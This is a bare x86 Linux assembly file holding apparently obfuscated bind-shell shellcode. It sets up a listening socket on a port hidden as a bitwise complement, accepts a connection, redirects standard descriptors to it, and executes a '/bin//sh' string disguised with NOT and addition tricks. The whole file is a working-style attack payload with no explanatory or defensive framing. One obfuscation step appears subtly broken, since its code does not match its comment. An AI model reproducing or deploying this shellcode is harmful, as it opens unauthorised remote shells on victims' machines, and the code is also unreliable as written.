global _start

section .text

_start:
	push	0x1
	push	eax
	push	0x33
	pop	eax
	add	esp, 4
	pop	ebx
	
	
	xor	esi,esi
	push	esi
	push	ebx
	push	0x2
	
	
	mov	ecx,esp
	add	eax, 0x33
	int	0x80
	
	pop	edi			        ; edi = 2
	xchg	edi,eax			; edi = sockfd , eax = 2 
	xchg	ebx,eax			; ebx = 2 , eax = 1
	mov	al,0x66
	
	
	push	esi			    ; esi = 0
	
	push	word  0xC6FA	; compliment of 3905
	not 	word [esp]
	
	push	bx
	mov	ecx,esp
	push	0xE			    ; push E instead of 10
	add	[esp], ebx		    ; add 2 to be 10 again
	push	ecx
	push	edi
	mov	ecx,esp
	
	
	int	0x80
	
	mov	al,0x66
	add	bl,0x2			    ; add 2
	
	add	esp, 4
	mov	dword [esp], edx	; make it 0
	sub	esp, 4
		
	;push   esi
	
	;push	edi
	mov	ecx,esp
	int	0x80
	
	mov    al,0x66
	inc    ebx
	
	add	esp, 8
	mov	dword [esp], edx           ; make it 0
	sub	esp, 8
	
	;push   esi
	;push   esi
	;push   edi
	
	mov	ecx,esp
	int	0x80
	; deleted
	xor ecx, ecx
	mul ecx
	mov	cl,0x2

loop:
	mov	al,0x3f
	int	0x80
	;dec	ecx
	loop	loop
	
	mov	al,0xb
	push	0x68732F2F              ; compliment of 0x68732f2f
	not	dword [esp]
	
	push	0x5D58511E		        ; 0x5D58511E + 0x11111111 = 0x6e69622f
	add	dword [esp], 0x11111111
	
	mov	ebx,esp
	
	mov	ecx,edx
	int	0x80